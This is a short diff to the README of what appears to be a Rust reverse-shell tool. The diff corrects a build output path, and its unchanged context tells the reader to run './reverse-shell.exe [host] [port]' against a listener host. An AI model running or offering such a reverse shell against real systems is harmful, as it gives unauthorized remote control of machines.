@@ -7,7 +7,7 @@ Compile the code with
 ```
 cargo build --release
 ```
-The executable will be in `/target/release`. Just run it with your listener host and port as arguments.
+The executable will be in `target/release`. Just run it with your listener host and port as arguments.
 ```
 ./reverse-shell.exe [host] [port]
 ```
